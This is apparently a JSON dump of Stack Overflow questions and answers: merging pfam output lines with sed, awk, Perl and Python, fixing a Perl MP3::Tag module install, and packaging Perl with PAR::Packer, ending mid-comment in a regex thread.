"last_activity_date": 1457491951, "creation_date": 1457491951, "answer_id": 35882010, "question_id": 35881844, "link": "https://stackoverflow.com/questions/35881844/concatenating-multiple-rows-into-single-line-in-pfam-output-file/35882010#35882010", "title": "Concatenating multiple rows into single line in pfam output file", "body": "<p>You could use python regex to do something like this</p>\n\n<pre><code>import re\n\nout_lines = []\nwith open('file.txt', 'r') as f:\n    key = None\n    key_lines = []\n    for line in f:\n        m = re.match(r'^(\\S+)\\s(.+)$', line)\n        k, v = m.group(1), m.group(2)\n        if k != key:\n            if key:\n                out_lines.append('{0} {1}'.format(key, ' | '.join(key_lines)))\n            key = k\n            key_lines = [v]\n        else:\n            key_lines.append(v)\n    else:\n        if key:\n            out_lines.append('{0} {1}'.format(key, ' | '.join(key_lines)))\n\nwith open('out.txt', 'w') as f:\n    f.write('\\n'.join(out_lines))\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 32690, "user_id": 3266847, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/U0oyt.png?s=128&g=1", "display_name": "Benjamin W.", "link": "https://stackoverflow.com/users/3266847/benjamin-w"}, "is_accepted": false, "score": 0, "last_activity_date": 1457492755, "last_edit_date": 1457492755, "creation_date": 1457492442, "answer_id": 35882078, "question_id": 35881844, "link": "https://stackoverflow.com/questions/35881844/concatenating-multiple-rows-into-single-line-in-pfam-output-file/35882078#35882078", "title": "Concatenating multiple rows into single line in pfam output file", "body": "<p>With GNU sed:</p>\n\n<pre><code>$ sed -r ':a;N;s/^([^ ]*)( .*)\\n\\1(.*)$/\\1\\2 |\\3/;ta;P;D' infile\nTRINITY_GG_428_c0_g1_i1_orf1 PF13499.1 EF_hand_5 | PF00036.27 efhand | PF13405.1 EF_hand_4 | PF13833.1 EF_hand_6 | PF13202.1 EF_hand_3\nTRINITY_GG_429_c0_g1_i1_orf1 PF00156.22 Pribosyltran\nTRINITY_GG_431_c5_g1_i1_orf1 PF00475.13 IGPD\nTRINITY_GG_461_c0_g1_i1_orf1 PF01208.12 URO-D | PF12876.2 Cellulase-like\n</code></pre>\n\n<p>The main part is the substitution: it checks if two lines start with the same string (up to the first space), and if yes, concatenates the lines, removes the string from the second line and replaces the newline with a pipe.</p>\n\n<p>Split up:</p>\n\n<pre><code>:label     # Label to branch to\nN          # Append next line to pattern space\ns/^([^ ]*)( .*)\\n\\1(.*)$/\\1\\2 |\\3/  # Substitution\nt label    # Branch to label if the substitution took place\nP          # Strings weren't identical: print up to newline\nD          # Delete up to newline, start new cycle (second line become first line)\n</code></pre>\n\n<p>To make this work with BSD sed, we have to split the command around labels and use the <code>-E</code> flag instead of <code>-r</code>:</p>\n\n<pre><code>sed -E -e ':a' -e 'N;s/^([^ ]*)( .*)\\n\\1(.*)$/\\1\\2 |\\3/;ta' -e 'P;D' infile\n</code></pre>\n\n<p>And for good measure, a closer look at the substitution:</p>\n\n<pre><code>s/            # Start substitution\n    ^         # Anchor at start of pattern space\n    ([^ ]*)   # Match and capture non-space characters (group #1)\n    ( .*)     # Capture up to end of line (group #2)\n    \\n        # Match newline\n    \\1        # Start of second line: match first capture group\n    (.*)      # Capture rest of second line (group #3)\n    $         # Anchor at end of pattern space\n/             # Delimiter for substitution\n    \\1\\2 |\\3  # Substitute: captures groups 1 and 2, space, pipe, capture group 3\n/             # End of substitution\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1467889826, "last_edit_date": 1467889826, "creation_date": 1457494264, "answer_id": 35882373, "question_id": 35881844, "link": "https://stackoverflow.com/questions/35881844/concatenating-multiple-rows-into-single-line-in-pfam-output-file/35882373#35882373", "title": "Concatenating multiple rows into single line in pfam output file", "body": "<p>This is a very common programming pattern. You need to use a Perl hash to accumulate all the data belonging to each different initial field (the key). Then it is only necessary to print the hash in the order and format required</p>\n\n<p>This program demonstrates. I have assumed that you want the keys printed in the lexical order of the keys. If you need anything different, such as the order they first appear in the source data, then please say so\u2014a small change is necessary</p>\n\n<p>This program expects the path to the input file as a parameter on the command line, and sends its output to STDOUT, which may be redirected in the normal way</p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nmy %data;\n\nwhile ( &lt;&gt; ) {\n    chomp;\n    my ($key, $val) = split ' ', $_, 2;\n    push @{ $data{$key} }, $val;\n}\n\nprint $_, ' ', join(' | ', @{ $data{$_} }), \"\\n\" for sort keys %data;\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>TRINITY_GG_428_c0_g1_i1_orf1 PF13499.1 EF_hand_5 | PF00036.27 efhand | PF13405.1 EF_hand_4 | PF13833.1 EF_hand_6 | PF13202.1 EF_hand_3\nTRINITY_GG_429_c0_g1_i1_orf1 PF00156.22 Pribosyltran\nTRINITY_GG_431_c5_g1_i1_orf1 PF00475.13 IGPD\nTRINITY_GG_461_c0_g1_i1_orf1 PF01208.12 URO-D | PF12876.2 Cellulase-like\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 116, "user_id": 6037276, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c5db32b4fd2fbb593a5997ca0ff9a67b?s=128&d=identicon&r=PG&f=1", "display_name": "ginkgo", "link": "https://stackoverflow.com/users/6037276/ginkgo"}, "edited": false, "score": 0, "creation_date": 1465978773, "post_id": 35893754, "comment_id": 63121643, "body": "Is it OK when I replace the <b>a[$1]</b> to <b>$0</b> like this: <code>awk &#39;{a[$1]=($1 in a ? $0&quot; | &quot;$2&quot; &quot;$3 : $0)} END{for (k in a) print a[k]}&#39; file</code>?"}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "reply_to_user": {"reputation": 116, "user_id": 6037276, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c5db32b4fd2fbb593a5997ca0ff9a67b?s=128&d=identicon&r=PG&f=1", "display_name": "ginkgo", "link": "https://stackoverflow.com/users/6037276/ginkgo"}, "edited": false, "score": 0, "creation_date": 1465997047, "post_id": 35893754, "comment_id": 63134576, "body": "Not sure I understand the question but <code>a[$1]=($1 in a ? $0&quot; | &quot;$2&quot; &quot;$3 : $0)</code> would be better written as <code>a[$1]=$0 ($1 in a ? &quot; | &quot;$2&quot; &quot;$3 : &quot;&quot;)</code> so you&#39;re only stating the common part, $0, once and making it explicit that it happens unconditionally."}], "tags": [], "owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "is_accepted": false, "score": 0, "last_activity_date": 1457532616, "last_edit_date": 1457532616, "creation_date": 1457532177, "answer_id": 35893754, "question_id": 35881844, "link": "https://stackoverflow.com/questions/35881844/concatenating-multiple-rows-into-single-line-in-pfam-output-file/35893754#35893754", "title": "Concatenating multiple rows into single line in pfam output file", "body": "<p>Just build up a record of the concatenation of all the lines while the first field of the current line is the same as it was on the previous line, and then print it when the value of the first field changes:</p>\n\n<pre><code>$ awk '\n    $1==prev { rec = rec \" | \" $2 \" \" $3 }\n    $1!=prev { if (NR&gt;1) print rec; rec=$0 }\n    { prev=$1 }\n    END { print rec }\n' file\nTRINITY_GG_428_c0_g1_i1_orf1 PF13499.1 EF_hand_5 | PF00036.27 efhand | PF13405.1 EF_hand_4 | PF13833.1 EF_hand_6 | PF13202.1 EF_hand_3\nTRINITY_GG_429_c0_g1_i1_orf1 PF00156.22 Pribosyltran\nTRINITY_GG_431_c5_g1_i1_orf1 PF00475.13 IGPD\nTRINITY_GG_461_c0_g1_i1_orf1 PF01208.12 URO-D | PF12876.2 Cellulase-like\n</code></pre>\n\n<p>Alternatively if your input line keys weren't contiguous and you don't care about output order being the same as input order and your input file is small enough to keep it all in memory, then you could use the hashing approach suggesting in a different answer:</p>\n\n<pre><code>$ awk '{a[$1]=($1 in a ? a[$1]\" | \"$2\" \"$3 : $0)} END{for (k in a) print a[k]}' file\nTRINITY_GG_429_c0_g1_i1_orf1 PF00156.22 Pribosyltran\nTRINITY_GG_461_c0_g1_i1_orf1 PF01208.12 URO-D | PF12876.2 Cellulase-like\nTRINITY_GG_431_c5_g1_i1_orf1 PF00475.13 IGPD\nTRINITY_GG_428_c0_g1_i1_orf1 PF13499.1 EF_hand_5 | PF00036.27 efhand | PF13405.1 EF_hand_4 | PF13833.1 EF_hand_6 | PF13202.1 EF_hand_3\n</code></pre>\n"}], "owner": {"reputation": 116, "user_id": 6037276, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c5db32b4fd2fbb593a5997ca0ff9a67b?s=128&d=identicon&r=PG&f=1", "display_name": "ginkgo", "link": "https://stackoverflow.com/users/6037276/ginkgo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 180, "favorite_count": 0, "answer_count": 4, "score": 0, "last_activity_date": 1467889826, "creation_date": 1457490744, "last_edit_date": 1457494491, "question_id": 35881844, "link": "https://stackoverflow.com/questions/35881844/concatenating-multiple-rows-into-single-line-in-pfam-output-file", "title": "Concatenating multiple rows into single line in pfam output file", "body": "<p>I have the following data in multiple lines:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>TRINITY_GG_428_c0_g1_i1_orf1 PF13499.1 EF_hand_5\nTRINITY_GG_428_c0_g1_i1_orf1 PF00036.27 efhand\nTRINITY_GG_428_c0_g1_i1_orf1 PF13405.1 EF_hand_4\nTRINITY_GG_428_c0_g1_i1_orf1 PF13833.1 EF_hand_6\nTRINITY_GG_428_c0_g1_i1_orf1 PF13202.1 EF_hand_3\nTRINITY_GG_429_c0_g1_i1_orf1 PF00156.22 Pribosyltran\nTRINITY_GG_431_c5_g1_i1_orf1 PF00475.13 IGPD\nTRINITY_GG_461_c0_g1_i1_orf1 PF01208.12 URO-D\nTRINITY_GG_461_c0_g1_i1_orf1 PF12876.2 Cellulase-like\n</code></pre>\n\n<p>What I want to do is to convert them into one line:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>TRINITY_GG_428_c0_g1_i1_orf1 PF13499.1 EF_hand_5 | PF00036.27 efhand | PF13405.1 EF_hand_4 | PF13833.1 EF_hand_6 | PF13202.1 EF_hand_3\nTRINITY_GG_429_c0_g1_i1_orf1 PF00156.22 Pribosyltran\nTRINITY_GG_431_c5_g1_i1_orf1 PF00475.13 IGPD\nTRINITY_GG_461_c0_g1_i1_orf1 PF01208.12 URO-D | PF12876.2 Cellulase-like\n</code></pre>\n\n<p>Matching lines are always next to each other.</p>\n\n<p>How could this be solved in sed/awk/Perl/Python?</p>\n"}, {"tags": ["perl", "cpan"], "comments": [{"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1457486960, "post_id": 35881246, "comment_id": 59425613, "body": "Try using <a href=\"https://github.com/miyagawa/cpanminus\" rel=\"nofollow noreferrer\"><code>cpanm</code></a> instead, it is a far more user friendly CPAN client than <code>cpan</code>."}, {"owner": {"reputation": 50, "user_id": 4439196, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CILOR.png?s=128&g=1", "display_name": "OxenMeat", "link": "https://stackoverflow.com/users/4439196/oxenmeat"}, "reply_to_user": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1457487219, "post_id": 35881246, "comment_id": 59425692, "body": "<code>cpanm</code> seems to have at least done something. I still get the same issue when trying to run the program itself though."}, {"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 1, "creation_date": 1457487335, "post_id": 35881246, "comment_id": 59425722, "body": "Then you probably have multiple copies of Perl installed. Your program is using one, and cpanm is installing to another. cpanm will use whatever Perl is in your PATH, check with <code>which perl</code> and check that against your <code>#!</code> line at the top of your program."}, {"owner": {"reputation": 50, "user_id": 4439196, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CILOR.png?s=128&g=1", "display_name": "OxenMeat", "link": "https://stackoverflow.com/users/4439196/oxenmeat"}, "reply_to_user": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1457487675, "post_id": 35881246, "comment_id": 59425823, "body": "They are both usr/bin/perl . But I think you&#39;re right. I noticed I have a perl5 with mp3 stuff in it located in my documents somewhere. How could I change this or move it?"}, {"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1457487776, "post_id": 35881246, "comment_id": 59425839, "body": "That&#39;s odd. Check <code>which cpanm</code> and see if that&#39;s coming from somewhere odd. I&#39;d also check <code>env | grep -i perl</code> to see if any environment variables affecting installation are set."}, {"owner": {"reputation": 50, "user_id": 4439196, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CILOR.png?s=128&g=1", "display_name": "OxenMeat", "link": "https://stackoverflow.com/users/4439196/oxenmeat"}, "reply_to_user": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1457487914, "post_id": 35881246, "comment_id": 59425876, "body": "<code>which cpanm</code> is <code>usr&#47;bin&#47;cpanm</code> ... <code>env | grep -i perl</code> is my perl5 in some random documents"}, {"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "reply_to_user": {"reputation": 50, "user_id": 4439196, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CILOR.png?s=128&g=1", "display_name": "OxenMeat", "link": "https://stackoverflow.com/users/4439196/oxenmeat"}, "edited": false, "score": 0, "creation_date": 1457487995, "post_id": 35881246, "comment_id": 59425899, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/105748/discussion-between-schwern-and-oxenmeat\">continue this discussion in chat</a>."}, {"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1457488131, "post_id": 35881246, "comment_id": 59425939, "body": "You might not have the rep for chat. All that perl stuff in your environment is likely what is causing the problem. If you the output of <code>env | grep -i perl</code> to your question then people might be able to help."}, {"owner": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "edited": false, "score": 0, "creation_date": 1457532209, "post_id": 35881246, "comment_id": 59448158, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/65865/whats-the-easiest-way-to-install-a-missing-perl-module\">What&#39;s the easiest way to install a missing Perl module?</a>"}], "answers": [{"tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": true, "score": 1, "last_activity_date": 1457489220, "last_edit_date": 1457489220, "creation_date": 1457488514, "answer_id": 35881530, "question_id": 35881246, "link": "https://stackoverflow.com/questions/35881246/mp3tag-not-working/35881530#35881530", "title": "MP3::Tag - not working", "body": "<p>It seems your <code>cpan</code> client is misconfigured, it doesn't seem to have a proper list of CPAN modules.  <a href=\"https://github.com/miyagawa/cpanminus\" rel=\"nofollow\"><code>cpanm</code></a> is a more user friendly CPAN client than <code>cpan</code>, I recommend using it instead.</p>\n\n<p>If a freshly installed <code>cpanm</code> installs the module but you're still getting the error, and if <code>which perl</code> and the Perl in your <code>#!</code> line are the same, then your modules are probably getting installed outside the standard Perl library locations.  There's a few ways this could happen, the first is to check for environment variables affecting your installation.  <code>env | grep -i perl</code> is a good start.  Things like <code>PERL_MB_OPT</code> and <code>PERL_MM_OPT</code> will alter how <code>cpan</code> and <code>cpanm</code> call the Build.PL and Makefile.PL installers.</p>\n\n<p>If <code>PERL_M*_OPT</code> are set then there should be a corresponding <code>PERL5LIB</code> to tell Perl to look in the non-standard location for those modules.</p>\n\n<p>This is usually done to allow non-root users to install modules into their home directory.</p>\n\n<p>In your case you seem to have <code>PERL_M*_OPT</code> set but no <code>PERL5LIB</code>.  You'll need to set <code>PERL5LIB</code> to where ever the modules got installed, probably <code>/home/bronson/perl5/lib/perl5/</code>.</p>\n\n<hr>\n\n<p>This can all get a bit hairy.  There's two tools to make this easier.</p>\n\n<p>First is <a href=\"http://perlbrew.pl/\" rel=\"nofollow\">Perlbrew</a>.  It installs Perl in your home directory and configures everything for you.  It can even support multiple versions.  This is the simplest and recommended way to develop Perl.  It gives you full control over the Perl installation, you're not tied to what the system has installed.</p>\n\n<p>The other is to use <a href=\"https://metacpan.org/pod/local::lib\" rel=\"nofollow\"><code>local::lib</code></a> to manage your Perl environment.  It will help you set Perl environment variables to install Perl modules to your home directory and use them.  You might have a mangled version of that right now.</p>\n"}], "owner": {"reputation": 50, "user_id": 4439196, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CILOR.png?s=128&g=1", "display_name": "OxenMeat", "link": "https://stackoverflow.com/users/4439196/oxenmeat"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 522, "favorite_count": 0, "accepted_answer_id": 35881530, "answer_count": 1, "score": 1, "last_activity_date": 1457529596, "creation_date": 1457486589, "last_edit_date": 1457488469, "question_id": 35881246, "link": "https://stackoverflow.com/questions/35881246/mp3tag-not-working", "title": "MP3::Tag - not working", "body": "<p>I am trying to write a small program in perl which uses the MP3::Tag module.\nThe program doesn't execute and gives me:</p>\n\n<pre><code>Can't locate MP3/Tag.pm in @INC (you may need to install the MP3::Tag module) (@INC contains: ... .) at mp3Editor.pl line 3.\n</code></pre>\n\n<p>where line 3 is: <code>use MP3::Tag;</code></p>\n\n<p>So then I try the command: <code>cpan MP3::Tag</code></p>\n\n<p>but I get: <code>Warning: Cannot install MP3::Tag, don't know what it is.</code></p>\n\n<p>I've downloaded the module from CPAN's website, however I can't seem to get it working. What must I do to get <strong>MP3::Tag</strong> module working on my system? Any help is appreciated. Thank you.</p>\n\n<p><strong>EDIT</strong>  <code>env | grep -i perl</code> produces:</p>\n\n<pre><code>PERL_MB_OPT=--install_base \"/home/bronson/perl5\"\nPERL_MM_OPT=INSTALL_BASE=/home/bronson/perl5\n</code></pre>\n"}, {"tags": ["perl", "exe", "mojo"], "answers": [{"comments": [{"owner": {"reputation": 79, "user_id": 2483640, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/30da7d33d2decf0b14f4ca33b140c0b5?s=128&d=identicon&r=PG", "display_name": "Jacob Sokol", "link": "https://stackoverflow.com/users/2483640/jacob-sokol"}, "edited": false, "score": 0, "creation_date": 1457506687, "post_id": 35883268, "comment_id": 59431796, "body": "As you wrote, I used &quot;pp - o test.exe test.pl&quot;"}, {"owner": {"reputation": 79, "user_id": 2483640, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/30da7d33d2decf0b14f4ca33b140c0b5?s=128&d=identicon&r=PG", "display_name": "Jacob Sokol", "link": "https://stackoverflow.com/users/2483640/jacob-sokol"}, "edited": false, "score": 0, "creation_date": 1457513687, "post_id": 35883268, "comment_id": 59435333, "body": "Thank you dasgar for your help. I used &quot;pp -c test.pl&quot; and it works :)"}], "tags": [], "owner": {"reputation": 160, "user_id": 6027771, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d6e6b84a2a791c8e260ed0b95cbac292?s=128&d=identicon&r=PG&f=1", "display_name": "dasgar", "link": "https://stackoverflow.com/users/6027771/dasgar"}, "is_accepted": true, "score": 1, "last_activity_date": 1457499743, "creation_date": 1457499743, "answer_id": 35883268, "question_id": 35877655, "link": "https://stackoverflow.com/questions/35877655/perl-exe-file-cant-call-method-encode-on-an-undefined-value/35883268#35883268", "title": "Perl .exe file: Can&#39;t call method \u201cencode\u201d on an undefined value", "body": "<p>If you could provide the details how you used the pp utility from PAR::Packer, it might be easier for others to provide assistance.  Without those details, I'm going to assume that you did something like \"pp -o test.exe test.pl\".</p>\n\n<p>The first thing that I would suggest would be to use the -c and/or -x options.  Those options are used \"to determine additonal run-time dependencies\".  Keep in mind that those are case-sensitive options.</p>\n\n<p>If that doesn't fix all of the issues, you may need to use additional options.  Check the documentation for the <a href=\"https://metacpan.org/pod/pp\" rel=\"nofollow\">pp</a> utility for more details on the other options.</p>\n\n<p>Also, I noticed that you added the \"mojo\" tag to your question, so I'm assuming that your code is using Mojolicious.  If that's the case, you may want to check out this <a href=\"http://blag.nullteilerfrei.de/2013/05/17/building-perl-stand-alone-applications-with-a-gui-using-mojolicious-and-par-packer/\" rel=\"nofollow\">blog</a> for some help on creating a stand alone application using Mojolicious.</p>\n"}, {"tags": [], "owner": {"reputation": 675, "user_id": 3227721, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HtyqY.jpg?s=128&g=1", "display_name": "Atafar", "link": "https://stackoverflow.com/users/3227721/atafar"}, "is_accepted": false, "score": 1, "last_activity_date": 1611865608, "creation_date": 1611865608, "answer_id": 65944714, "question_id": 35877655, "link": "https://stackoverflow.com/questions/35877655/perl-exe-file-cant-call-method-encode-on-an-undefined-value/65944714#65944714", "title": "Perl .exe file: Can&#39;t call method \u201cencode\u201d on an undefined value", "body": "<p>I had a similar problem, and for me the problem was solved by this answer <a href=\"https://stackoverflow.com/a/18523251/3227721\">https://stackoverflow.com/a/18523251/3227721</a> by <a href=\"https://stackoverflow.com/users/474819/nate-glenn\">Nate Glenn</a> to this question <a href=\"https://stackoverflow.com/questions/18522945/what-to-include-when-using-encode-with-par-packer\">What to include when using Encode with PAR Packer</a>:</p>\n<blockquote>\n<p>The culprit was a run-time require used by Encode.pm, line 120, to load Encode::Unicode. To make this program work, I used the following:</p>\n</blockquote>\n<blockquote>\n<p><code>pp -o encode_test.exe encode_test.pl -M C:/strawberry/perl/lib/Encode/Unicode.pm</code></p>\n</blockquote>\n<p>I used <code>-M Encode::Unicode</code>.</p>\n"}], "owner": {"reputation": 79, "user_id": 2483640, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/30da7d33d2decf0b14f4ca33b140c0b5?s=128&d=identicon&r=PG", "display_name": "Jacob Sokol", "link": "https://stackoverflow.com/users/2483640/jacob-sokol"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 212, "favorite_count": 0, "accepted_answer_id": 35883268, "answer_count": 2, "score": -1, "last_activity_date": 1611865608, "creation_date": 1457469902, "question_id": 35877655, "link": "https://stackoverflow.com/questions/35877655/perl-exe-file-cant-call-method-encode-on-an-undefined-value", "title": "Perl .exe file: Can&#39;t call method \u201cencode\u201d on an undefined value", "body": "<p>I am begginer of the Perl. \nI made my Perl script and I want to  make a Perl script into a self-contained executable. To create .exe file I used <code>PAR::Packer</code>. After creating and executing .exe file I get such error: </p>\n\n<pre><code>  Can't call method \"encode\" on an undefined value at Win32/Unicode/Util.pm line 36, &lt;DATA&gt; line 2125.\n    Compilation failed in require at Win32/Unicode.pm line 14, &lt;DATA&gt; line 2125.\n    BEGIN failed--compilation aborted at Win32/Unicode.pm line 14, &lt;DATA&gt; line 2125.\n    Compilation failed in require at if.pm line 13, &lt;DATA&gt; line 2125.\n    BEGIN failed--compilation aborted at App/Weryfikacja/Term.pm line 7, &lt;DATA&gt; line 2125.\n    Compilation failed in require at App/Weryfikacja/Log.pm line 8, &lt;DATA&gt; line 2125.\n    BEGIN failed--compilation aborted at App/Weryfikacja/Log.pm line 8, &lt;DATA&gt; line 2125.\n    Compilation failed in require at App/Weryfikacja.pm line 17, &lt;DATA&gt; line 2125.\n    BEGIN failed--compilation aborted at App/Weryfikacja.pm line 17, &lt;DATA&gt; line 2125.\n    Compilation failed in require at script/diagfull.pl line 54, &lt;DATA&gt; line 2125.\n    BEGIN failed--compilation aborted at script/diagfull.pl line 54, &lt;DATA&gt; line 2125.\n</code></pre>\n\n<p>I want to notice that Perl script runs well. What can cause my .exe file doesn't work? Maybe I need to add modules or something like that to .exe file? </p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457469323, "post_id": 35877362, "comment_id": 59418324, "body": "But why? The version with the braces is so much clearer (especially with longer function bodies). Just out of curiosity, what language is this that doesn&#39;t require braces around function definitions?"}, {"owner": {"reputation": 4590, "user_id": 3120884, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/116656a5f0b09d1a524808706d709d9c?s=128&d=identicon&r=PG&f=1", "display_name": "stevesliva", "link": "https://stackoverflow.com/users/3120884/stevesliva"}, "edited": false, "score": 1, "creation_date": 1457469712, "post_id": 35877362, "comment_id": 59418543, "body": "Text::Balanced <code>extract_bracketed</code> but unfortunately you have to stuff your text into a multiline string."}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1457469741, "post_id": 35877362, "comment_id": 59418552, "body": "Maybe it&#39;s one step in a C-to-XS converter."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457471383, "post_id": 35877362, "comment_id": 59419465, "body": "@ThisSuitIsBlackNot Python? I&#39;ve heard they replaced braces with indentation. It&#39;s a matter of taste but I prefer the curlies."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1457471634, "post_id": 35877362, "comment_id": 59419592, "body": "@PerlDog  Yes, no curlies in Python ... but this is not Python code."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1457471877, "post_id": 35877362, "comment_id": 59419725, "body": "@zdim Well, we once had a really ugly script at work and a coworker asked \u201cwhat language is it written in?\u201d. We simply answered 